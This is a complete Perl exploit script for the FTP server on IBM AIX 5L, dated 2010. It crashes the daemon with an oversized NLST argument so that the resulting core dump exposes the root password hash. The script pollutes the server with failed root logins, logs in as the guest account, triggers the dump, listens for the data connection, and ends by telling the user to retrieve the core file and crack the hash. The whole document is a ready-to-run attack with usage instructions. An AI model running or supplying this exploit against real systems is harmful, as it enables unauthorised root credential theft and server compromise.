### AIXCOREDUMP.PL ---
### --== ~ AIX5l w/ FTP-SERVER REMOTE ROOT HASH DISCLOSURE EXPLOIT ~ =--
### CREATES COREDUMP INCLUDING THE ROOT USER HASH FROM /etc/security/passwd
### THE RESULT FILE IS SCRAMBLED - SEEK FOR DES LOOKING CRYPTO KEYS
### SUCCESSFULLY TESTED ON IBM AIX 5.1
### DISCOVERED & EXPLOITED BY KINGCOPE
### JULY 2010

use IO::Socket;

$|=1;

print "--== ~ AIX5l w/ FTP-SERVER REMOTE ROOT HASH DISCLOSURE EXPLOIT ~ =--\n";
print "CREATES COREDUMP INCLUDING THE ROOT USER HASH FROM /etc/security/passwd\n";
print "BY KINGCOPE\n";
print "JULY 2010\n\n";

if ($#ARGV < 1) {
	print "USAGE: ./AIXCOREDUMP.PL <target address> <your ip> [username] [password]\n";
	print "SAMPLES:\n";
	print "YOU HAVE A LOGIN ./AIXCOREDUMP.PL 192.168.1.150 192.168.1.25 kcope passwd\n";
	print "USE GUEST ACCOUNT - NEEDS WRITE ACCESS IN /PUB ./AIXCOREDUMP.PL 192.168.1.150 192.168.1.25\n";
	exit;
}

$trgt = $ARGV[0];

$sock = IO::Socket::INET->new(PeerAddr => $trgt,
                              PeerPort => '21',
                              Proto    => 'tcp');
srand(time());
$port = int(rand(31337-1022)) + 1025;
$locip = $ARGV[1];
$locip =~ s/\./,/gi;

if ($ARGV[2] eq "") {
	$user = "ftp";
	$pass = "c0deb4b3\@roothash.com";
} else {
	$user = $ARGV[2];
	$passwd = $ARGV[3];
}

$x = <$sock>;
print "*AIX EXPLOIT* REMOTE FTPD: $x\n";
if (fork()) {
for ($k=0;$k<3;$k++) {
print "*AIX EXPLOIT* POLLUTING FTPD***\n";
print "\t$x";
print $sock "USER root\r\n";
$x = <$sock>;
print "\t$x";
print $sock "PASS sexy\r\n";
$x = <$sock>;
print "\t$x";
}

print "*AIX EXPLOIT* ACCESSING FOLDER***\n";
print $sock "USER $user\r\n";
$x = <$sock>;
print "\t$x";
print $sock "PASS $passwd\r\n";
$x = <$sock>;
print "\t$x";

if ($ARGV[2] eq "") {
print "*AIX EXPLOIT* CWD TO PUB***\n";
print $sock "CWD pub\r\n";
$x = <$sock>;
print "\t$x";
}

print $sock "PORT $locip," . int($port / 256) . "," . int($port % 256) . "\r\n";
$x = <$sock>;
print "\t$x";

print "*AIX EXPLOIT* TRIGGERING COREDUMP***\n";
print $sock "NLST ~" . "A" x 5000 . "\r\n";
$x = <$sock>;

while(<$sock>) {
	print;
}

print "*AIX EXPLOIT* (SUCCESS)***\n*AIX EXPLOIT* NOW RETRIEVE THE core FILE WITH YOUR FAVOURITE CLIENT AND LOOKUP THE R00T HASH++CRACKIT!***\n";
exit;
} else {
my $servsock = IO::Socket::INET->new(LocalAddr => "0.0.0.0", LocalPort => $port, Proto => 'tcp', Listen => 1);
die "Could not create socket: $!\n" unless $servsock;
my $new_sock = $servsock->accept();
while(<$new_sock>) {
print $_;
}
close($servsock);
}
## CHEERIO!